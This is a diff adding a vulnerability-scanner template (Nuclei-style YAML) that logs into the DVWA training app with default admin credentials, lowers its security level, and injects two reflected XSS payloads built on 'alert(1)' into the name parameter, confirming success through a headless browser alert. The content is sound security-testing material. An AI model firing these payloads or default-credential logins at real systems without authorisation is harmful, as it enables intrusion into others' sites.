@@ -1,0 +1,84 @@
+id: dvwa-headless-xss-reflected-low-sec
+
+info:
+  name: XSS Detection reflected (Headless) with - low sec (Authenticated)
+  author: Shieldia
+  severity: high
+  description: Detects reflected XSS by injecting JavaScript into the name value after authenticating to DVWA.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: xss,headless,javascript,user-agent,auth
+
+variables:
+  password: "password"
+  username: "admin"
+  payloads: 
+    - "<script>alert(1)</script>"
+    - "</script><script>alert(1);</script>"
+
+flow: |
+    http(1) && http(2);
+    for (let payload of iterate(template["payloads"])) {
+      set("payload", payload);
+      headless(1);
+      }
+
+
+http:
+  # Step 1: Authenticate and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+    # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+    # Step 3: Use the existing session to do the XSS attempt
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}/vulnerabilities/xss_r/?name={{payload}}"
+          timeout: 1
+      - action: waitdialog
+        name: xss_default_query
+    matchers:
+      - type: dsl
+        name: "XSS Match maths in alert window"
+        dsl:
+          - xss_default_query == true
+          - xss_default_query_message == "1"
+        condition: and
+    extractors:
+      - type: dsl
+        dsl:
+          - "payload"
